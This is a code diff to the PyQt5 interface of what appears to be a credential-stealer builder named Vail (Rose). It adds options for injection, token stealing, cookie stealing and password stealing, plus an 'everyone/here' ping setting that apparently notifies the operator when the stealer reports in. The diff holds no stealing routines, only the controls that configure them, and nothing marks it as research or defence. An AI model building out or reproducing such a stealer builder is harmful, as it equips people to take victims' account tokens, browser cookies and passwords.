@@ -1,7 +1,6 @@
-# Main GUI for Rose made by @suegdu
+# Main GUI for Vail (Rose) made by @suegdu
 # Follow the comments on each, for guiding.
-# Note: you might find some technical calling pointing to functions as "vail" it was the older name of the gui and its harder to change,
-# as it does not show any appearance to the end user. 
+
 
 from PyQt5 import QtCore, QtGui, QtWidgets
 import webbrowser
@@ -55,6 +54,29 @@ class Ui_MainWindow_vailB(object):
         self.CB_startup = QtWidgets.QCheckBox(self.groupBox_8)
         self.CB_startup.setGeometry(QtCore.QRect(20, 20, 70, 17))
         self.CB_startup.setObjectName("CB_startup")
+        self.CB_injection = QtWidgets.QCheckBox(self.groupBox_8)
+        self.CB_injection.setGeometry(QtCore.QRect(20, 50, 70, 17))
+        self.CB_injection.setObjectName("CB_injection")
+        self.CB_tokensteal = QtWidgets.QCheckBox(self.groupBox_8)
+        self.CB_tokensteal.setGeometry(QtCore.QRect(20, 80, 101, 17))
+        self.CB_tokensteal.setObjectName("CB_tokensteal")
+        self.CB_cookiesteal = QtWidgets.QCheckBox(self.groupBox_8)
+        self.CB_cookiesteal.setGeometry(QtCore.QRect(20, 110, 101, 17))
+        self.CB_cookiesteal.setObjectName("CB_cookiesteal")
+        self.CB_passsteal = QtWidgets.QCheckBox(self.groupBox_8)
+        self.CB_passsteal.setGeometry(QtCore.QRect(20, 140, 161, 17))
+        self.CB_passsteal.setObjectName("CB_passsteal")
+        self.groupBox_10 = QtWidgets.QGroupBox(self.groupBox_8)
+        self.groupBox_10.setGeometry(QtCore.QRect(10, 210, 181, 81))
+        self.groupBox_10.setObjectName("groupBox_10")
+        self.comboBox = QtWidgets.QComboBox(self.groupBox_10)
+        self.comboBox.setGeometry(QtCore.QRect(10, 50, 161, 22))
+        self.comboBox.setObjectName("comboBox")
+        self.comboBox.addItem("")
+        self.comboBox.addItem("")
+        self.ping = QtWidgets.QRadioButton(self.groupBox_10)
+        self.ping.setGeometry(QtCore.QRect(10, 20, 82, 17))
+        self.ping.setObjectName("ping")
         self.progressBar = QtWidgets.QProgressBar(self.groupBox_6)
         self.progressBar.setGeometry(QtCore.QRect(230, 70, 201, 20))
         self.progressBar.setProperty("value", 0)
@@ -139,6 +161,14 @@ class Ui_MainWindow_vailB(object):
         self.groupBox_7.setTitle(_translate("MainWindow_vailB", "Console"))
         self.groupBox_8.setTitle(_translate("MainWindow_vailB", "Settings"))
         self.CB_startup.setText(_translate("MainWindow_vailB", "Startup"))
+        self.CB_injection.setText(_translate("MainWindow_vailB", "Injection"))
+        self.CB_tokensteal.setText(_translate("MainWindow_vailB", "Token Stealing"))
+        self.CB_cookiesteal.setText(_translate("MainWindow_vailB", "Cookie Stealing"))
+        self.CB_passsteal.setText(_translate("MainWindow_vailB", "Password Stealing"))
+        self.groupBox_10.setTitle(_translate("MainWindow_vailB", "Ping Method"))
+        self.comboBox.setItemText(0, _translate("MainWindow_vailB", "everyone"))
+        self.comboBox.setItemText(1, _translate("MainWindow_vailB", "here"))
+        self.ping.setText(_translate("MainWindow_vailB", "Ping"))
         self.B_ghubupdates.setText(_translate("MainWindow_vailB", "Github For Updates"))
         self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_builder), _translate("MainWindow_vailB", "Builder"))
         self.groupBox_4.setTitle(_translate("MainWindow_vailB", "Credits"))
@@ -195,8 +225,7 @@ class Ui_MainWindow_vailB(object):
             self.prorsload()
             self.prorsunload()
 
-
-    # The main function once the Build button gets pushed.
+    # The main function when the Build button gets pushed.
     def pb_build(self):
         self.statusinsertor("\nStarted building....")
         self.prorsmng("start")
